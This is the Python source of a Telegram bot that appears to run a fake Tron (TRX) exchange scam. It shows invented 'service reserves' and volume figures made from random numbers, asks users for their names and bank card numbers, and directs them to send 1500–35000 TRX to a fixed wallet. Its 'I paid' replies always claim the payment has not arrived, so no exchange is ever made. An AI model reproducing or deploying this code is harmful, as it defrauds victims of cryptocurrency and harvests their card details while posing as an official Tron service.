from dataclasses import dataclass
import logging
from aiogram import Bot, Dispatcher, executor, types
from . import markups as nav
import random
from aiogram import types
from TOKEN import TOKEN
from datetime import datetime
import aiohttp
from bs4 import BeautifulSoup
import asyncio

I18N_DOMAIN = 'testbot'

CURRENCY_UPDATE_DELTA = 3

HEADERS = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.271 Yowser/2.5 Safari/537.36'
}

@dataclass
class CurrencyData:
    cost: float
    last_updated: datetime


bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
client = None
currencies = {}
trx_cost = None
last_updated = datetime.fromtimestamp(0)

async def update_currency(address):
    global client
    if client is None:
        client = aiohttp.ClientSession()
    async with client.get(address, headers=HEADERS) as response:
        if response.status == 200:
            html = await response.text()
            soup = BeautifulSoup(html, 'html.parser')
            spans = soup.select("span#last_last")
            if spans:
                span = spans[0]
                return span.string

async def get_trx_value(currency, address):
    current_time = datetime.now()
    if currency in currencies:
        delta = current_time - currencies[currency].last_updated
    if currency not in currencies or delta.total_seconds() > CURRENCY_UPDATE_DELTA:
        value = await update_currency(address)
        if currency is not None:
            currencies[currency] = CurrencyData(value, current_time)
    return currencies[currency].cost

async def last_message(message: types.Message):
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(476754321, 624334322)) + ' created.✔\n\nYou have chosen: exchange ' + str(message.text) + ' Tron(TRX). \n\nTransfer ' + str(message.text) + ' Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinM)

async def game_over_message(message: types.Message):
        await bot.send_message(message.chat.id,'Enter the correct amount of Tron!\n\nMin exchange amount = 1500 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)')



async def get_trx_rub():
    return await get_trx_value('RUB', 'https://www.investing.com/crypto/tron/trx-rub')

async def get_trx_usd():
    return await get_trx_value('USD', 'https://www.investing.com/crypto/tron/trx-usd')

async def get_trx_cny():
    return await get_trx_value('CNY', 'https://www.investing.com/crypto/tron/trx-cny')

async def get_trx_btc():
    return await get_trx_value('BTC', 'https://www.investing.com/crypto/tron/trx-btc')

async def get_trx_eur():
    return await get_trx_value('EUR', 'https://www.investing.com/crypto/tron/trx-eur')

async def get_trx_krw():
    return await get_trx_value('KRW', 'https://www.investing.com/crypto/tron/trx-krw')

async def get_trx_brl():
    return await get_trx_value('BRL', 'https://www.investing.com/crypto/tron/trx-brl')

async def get_trx_cad():
    return await get_trx_value('CAD', 'https://www.investing.com/crypto/tron/trx-cad')

@dp.message_handler(commands=['start'])
async def command_start(message: types.Message):
        await bot.send_message(message.chat.id,'Hello {0.first_name}! Here you can sell and exchange Tron(TRX) simply, quickly and securely!'.format(message.from_user), reply_markup = nav.mainMenu)

@dp.message_handler()
async def bot_message(message: types.Message):
    if message.text == '🔎 Contacts 📞':
        await bot.send_message(message.chat.id, '  TRON Official Telegram: http://t.me/tronnetworkEN\n\nTron Official site: https://tron.network\n\nUser support: @TRONGuardsupport', reply_markup = nav.Menu)

    elif message.text == 'ℹ Information ℹ':
        await bot.send_message(message.chat.id, 'TRX, one of the most promising cryptocurrencies listed on over 130 exchanges, brings together millions of investors around the world.\n\n'
            'Total Market Capitalization: $10,758.68M\n'
            'Number of Accounts: 33.36M\n'
            'Transaction volume (24 hours): $1,' + str(random.randint(512, 516)) + 'M\n\n'
            '                 APPLICATION SCENARIOS\n'
            'TRX is widely used in a variety of scenarios including payment, shopping and voting both inside and outside the TRON ecosystem. For example, TRX is supported by Spend credit card and TRON ATM for TRX payment and online transfer.\n\n'
            '                           TECHNOLOGY\n'
            'TRON is one of the largest blockchain operating systems in the world.\nThe high throughput is achieved by improving TPS in TRON, which has outperformed Bitcoin and Ethereum to the level of everyday use.\n\n'
            '                           SCALABILITY\n'
            'Apps are given a wider range of ways to release on TRON due to its scalability and highly efficient smart contract. It can support a huge number of users.\n\n'
            '                      HIGH RELIABILITY\n'
            'A more robust network structure, user asset, intrinsic value, and a higher degree of consensus decentralization lead to an improved reward distribution mechanism.\n\n'
            '                 TRON Official Telegram:\n'
            '               http://t.me/tronnetworkEN\n'
            '                            Official site:\n'
            '                    https://tron.network'
            , reply_markup = nav.Menu)
    
    elif message.text == 'I paid ✅':
        await bot.send_message(message.chat.id, 'Your payment has not yet arrived or has not been sent. Check if a transfer has been made. To do this, go to your Tron wallet and view your transfer history.\nSupport: @TRONGuardsupport' , reply_markup = nav.FinM)

    elif message.text == 'I paid':
        await bot.send_message(message.chat.id, 'Your payment has not yet arrived or has not been sent. Check if a transfer has been made. To do this, go to your Tron wallet and view your transfer history.\nSupport: @TRONGuardsupport' , reply_markup = nav.FinM)

    elif message.text == 'i paid':
        await bot.send_message(message.chat.id, 'Your payment has not yet arrived or has not been sent. Check if a transfer has been made. To do this, go to your Tron wallet and view your transfer history.\nSupport: @TRONGuardsupport' , reply_markup = nav.FinM)

    elif message.text == '/command3':
        await bot.send_message(message.chat.id, 'Hello {0.first_name}! Here you can sell and transfer Tron (TRX) simply, quickly and securely!'.format(message.from_user), reply_markup = nav.mainMenu)

    elif message.text == '⬅️ Main menu':
        await bot.send_message(message.chat.id, 'Select an action:' , reply_markup = nav.mainMenu)

    elif message.text == '/command2':
        await bot.send_message(message.chat.id, 'Select an action:' , reply_markup = nav.mainMenu)

    elif message.text == '/command1':
        await bot.send_message(message.chat.id, 'For questions about the work of the exchanger, please contact support\n@TRONGuardsupport' , reply_markup = nav.Menu)
    
    elif message.text == '💵 Exchange 💵':
        await bot.send_message(message.chat.id, 'Select currency to exchange:', reply_markup = nav.currencyMenu)
    
    elif message.text == 'The next step ➡️':
        await bot.send_message(message.chat.id, 'Please, make sure the details you entered are correct and continue.', reply_markup = nav.ContinueMenu)
    
    elif message.text == '⬅ Choose a currency':
        await bot.send_message(message.chat.id, 'Select currency to exchange:' , reply_markup = nav.currencyMenu)

    elif message.text == '🏛 Service reserves 🏛':
        await bot.send_message(message.chat.id, 'At the moment, the service reserves are:\n\nUSD: 12 ' + str(random.randint(112, 114)) +' '+ str(random.randint(679, 718)) + ' USD\n\nCNY: 16 ' + str(random.randint(321, 326)) +' '+ str(random.randint(862, 987)) +' CNY\n\nBTC: 18 ' + str(random.randint(145, 167)) +' BTC\n\nRUB: 27 ' + str(random.randint(611, 612)) +' '+ str(random.randint(124, 656)) +' RUB\n\nEUR: 13 ' + str(random.randint(112, 112)) +' '+ str(random.randint(240, 355)) + ' EUR\n\nKRW: 21 ' + str(random.randint(218, 219)) +' '+ str(random.randint(981, 989)) + ' KRW\n\nBRL: 16 ' + str(random.randint(897, 987)) +' '+ str(random.randint(111, 132)) + ' BRL\n\nUAH: 23 ' + str(random.randint(123, 132)) +' '+ str(random.randint(981, 989)) + ' UAH\n\nCAD: 10 ' + str(random.randint(567, 589)) +' '+ str(random.randint(212, 265)) + ' CAD', reply_markup = nav.Menu)

    elif message.text == '📊 Exchange rate 📊':
        
        a = 2.5
        b = 2.9
        u = random.uniform(a, b)

        rub = await get_trx_rub()
        usd = await get_trx_usd()
        cny = await get_trx_cny()
        btc = await get_trx_btc()
        eur = await get_trx_eur()
        krw = await get_trx_krw()
        uah = await get_trx_rub()
        brl = await get_trx_brl()
        cad = await get_trx_cad()

        uah_value = float(rub)
        rub_value = float(rub)
        usd_value = float(usd)
        cny_value = float(cny)
        btc_value = float(btc)
        eur_value = float(eur)
        krw_value = float(krw)
        brl_value = float(brl)
        cad_value = float(cad)

        tax = 1.16 # типа комиссия
        
        one_uah = rub_value * (tax / 2.7) 
        one_rub = rub_value * tax
        one_usd = usd_value * tax
        one_cny = cny_value * tax
        one_btc = btc_value * tax
        one_eur = eur_value * tax
        one_krw = krw_value * tax
        one_brl = brl_value * tax
        one_cad = cad_value * tax

        thousand_uah = 1000 * one_uah * tax
        thousand_rub = 1000 * rub_value * tax
        thousand_usd = 1000 * usd_value * tax
        thousand_cny = 1000 * cny_value * tax
        thousand_btc = 1000 * btc_value * tax
        thousand_eur = 1000 * eur_value * tax
        thousand_krw = 1000 * krw_value * tax
        thousand_brl = 1000 * brl_value * tax
        thousand_cad = 1000 * cad_value * tax

        zz = one_brl

        hh = float('{:.5}'.format(zz))

        zx = one_cad

        hg = float('{:.3}'.format(zx))

        s = one_uah

        b = float('{:.4}'.format(s))

        q = one_usd

        d = float('{:.3}'.format(q))

        w = one_cny

        v = float('{:.4}'.format(w))

        l = one_btc

        i = float('{:.4}'.format(l))

        t = one_rub

        m = float('{:.4}'.format(t))

        z = one_eur

        h = float('{:.3}'.format(z))

        aa = one_krw

        qw = float('{:.10}'.format(aa))


        await bot.send_message(message.chat.id, 'Current exchange rate:\n\n'
            '                      USD\n\n1 Tron(TRX) = ' + str(d) + ' USD\n_________________________\n\n' +
            '                      CNY\n\n1 Tron(TRX) = ' + str(v) + ' CNY\n_________________________\n\n' +
            '                      BTC\n\n1 Tron(TRX) = ' + str(i) + ' BTC\n_________________________\n\n' +
            '                      RUB\n\n1 Tron(TRX) = ' + str(m) + ' RUB\n_________________________\n\n' +
            '                      EUR\n\n1 Tron(TRX) = ' + str(h) + ' EUR\n_________________________\n\n' + 
            '                      KRW\n\n1 Tron(TRX) = ' + str(qw) + ' KRW\n_________________________\n\n' +
            '                      BRL\n\n1 Tron(TRX) = ' + str(hh) + ' BRL\n_________________________\n\n' +
            '                      UAH\n\n1 Tron(TRX) = ' + str(b) + ' UAH\n_________________________\n\n' +
            '                      CAD\n\n1 Tron(TRX) = ' + str(hg) + ' CAD', reply_markup = nav.Menu)
    
    elif message.text == 'BRL':
        
        tax = 1.14 # типа комиссия

        brl = await get_trx_brl()

        brl_value = float(brl)

        one_brl = brl_value * tax

        one_and_a_half_brl = 1500 * brl_value * tax #1500 tron

        two_thousand_brl = 2000 * brl_value * tax

        rr = one_and_a_half_brl

        ss = float('{:.5}'.format(rr))

        zz = one_brl

        hh = float('{:.3}'.format(zz))

        
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for BRL (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hh) + ' BRL' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(ss) + ' BRL\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in BRL currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
    
    elif message.text == 'CAD':
        
        tax = 1.14 # типа комиссия

        cad = await get_trx_cad()

        cad_value = float(cad)

        one_cad = cad_value * tax

        one_and_a_half_cad = 1500 * cad_value * tax #1500 tron

        two_thousand_cad = 2000 * cad_value * tax

        re = one_and_a_half_cad

        sd = float('{:.5}'.format(re))

        zx = one_cad

        hg = float('{:.3}'.format(zx))

        
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CAD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hg) + ' CAD' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(sd) + ' CAD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CAD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'UAH':

        tax = 1.14 # типа комиссия

        a = 2.65
        b = 2.75
        u = random.uniform(a, b)

        rub = await get_trx_rub()

        rub_value = float(rub)

        uah_value = float(rub)

        one_uah = rub_value * (tax / u) 

        uah = await get_trx_rub()

        thousand_uah = 1000 * one_uah * tax

        one_and_a_half_uah = 1500 * one_uah * tax #1500 tron

        x = one_and_a_half_uah

        a = float('{:.7}'.format(x))

        s = one_uah

        b = float('{:.4}'.format(s))

        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for UAH (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(b) + ' UAH' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(a) + ' UAH\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in UAH currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'USD':
        
        tax = 1.14 # типа комиссия

        usd = await get_trx_usd()

        usd_value = float(usd)

        one_usd = usd_value * tax

        one_and_a_half_usd = 1500 * usd_value * tax #1500 tron

        two_thousand_usd = 2000 * usd_value * tax

        u = one_and_a_half_usd

        c = float('{:.5}'.format(u))

        q = one_usd

        d = float('{:.3}'.format(q))
        
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for USD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(d) + ' USD' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(c) + ' USD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in USD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'CNY':
        
        tax = 1.12 # типа комиссия

        cny = await get_trx_cny()

        cny_value = float(cny)

        one_cny = cny_value * tax

        thousand_cny = 1000 * cny_value * tax

        one_and_a_half_cny = 1500 * cny_value * tax  #1500 tron

        two_thousand_cny = 2000 * cny_value * tax

        k = one_and_a_half_cny

        cn = float('{:.7}'.format(k))

        w = one_cny

        v = float('{:.4}'.format(w))
        
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CNY (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(v) + ' CNY' + '\nMinimum exchange amount:\n1500 Tron(TRX) = ' + str(cn) + ' CNY\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CNY currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'BTC':
        
        tax = 1.12 # типа комиссия

        btc = await get_trx_btc()

        btc_value = float(btc)

        one_btc = btc_value * tax

        thousand_btc = 1000 * btc_value * tax

        one_and_a_half_btc = 1500 * btc_value * tax  #1500 tron

        two_thousand_btc = 2000 * btc_value * tax

        o = one_and_a_half_btc

        p = float('{:.2}'.format(o))

        l = one_btc

        i = float('{:.4}'.format(l))
        
        await bot.send_message(message.chat.id, 'You have chosen to exchange Tron (TRX) to BTC (Binance / Other wallets) \n \nExchange rate: \n1 Tron (TRX) = '+ str (i) +' BTC '+' \nMinimum exchange amount: \n1500 Tron (TRX ) = '+ str (p) +' BTC \n \nEnter the wallet number to which you want to receive money in BTC currency. \nThe wallet number usually consists of ~34 characters and usually looks like this - TMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1 \n\nSend your last name, first name and wallet number to the bot, then press '+' "Next step" '+' \n\nIf the bot is entered an invalid wallet number, will automatically refund the money\n_________________________\nJustin Sun\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1', reply_markup = nav.nextMenu)
    
    elif message.text == 'RUB':

        tax = 1.16 # типа комиссия

        rub = await get_trx_rub()

        rub_value = float(rub)

        one_rub = rub_value * tax

        thousand_rub = 1000 * rub_value * tax

        one_and_a_half_rub = 1500 * rub_value * tax  #1500 tron

        two_thousand_rub = 2000 * rub_value * tax

        y = one_and_a_half_rub

        g = float('{:.7}'.format(y))

        t = one_rub

        m = float('{:.4}'.format(t))
        
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for RUB (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(m) + ' RUB' + '\nMinimum exchange amount:\n1500 Tron(TRX) = ' + str(g) + ' RUB\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in RUB currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'EUR':

        tax = 1.14 # типа комиссия

        eur = await get_trx_eur()

        eur_value = float(eur)

        one_eur = eur_value * tax

        thousand_eur = 1000 * eur_value * tax

        one_and_a_half_eur = 1500 * eur_value * tax  #1500 tron

        two_thousand_eur = 2000 * eur_value * tax

        r = one_and_a_half_eur

        ss = float('{:.5}'.format(r))

        z = one_eur

        h = float('{:.3}'.format(z))

        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for EUR (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(h) + ' EUR' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(ss) + ' EUR\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in EUR currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'KRW':

        tax = 1.12 # типа комиссия

        krw = await get_trx_krw()

        krw_value = float(krw)

        one_krw = krw_value * tax

        thousand_krw = 1000 * krw_value * tax

        one_and_a_half_krw = 1500 * krw_value * tax  #1500 tron

        two_thousand_krw = 2000 * krw_value * tax

        j = one_and_a_half_krw

        e = float('{:.7}'.format(j))

        aa = one_krw

        qw = float('{:.4}'.format(aa))

        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for KRW (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(qw) + ' KRW' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(e) + ' KRW\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in KRW currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)

    elif message.text == 'Continue ➡️':
        await bot.send_message(message.chat.id, 'Enter the amount of currency you would like to exchange:\n\nMin exchange amount = 1500 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)', reply_markup=types.ReplyKeyboardRemove())

    if float(message.text) >= 1500 and float(message.text) <= 35000:
        return await last_message(message)

    if float(message.text) < 1500 or float(message.text) > 35000:
        return await game_over_message(message)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates = True)
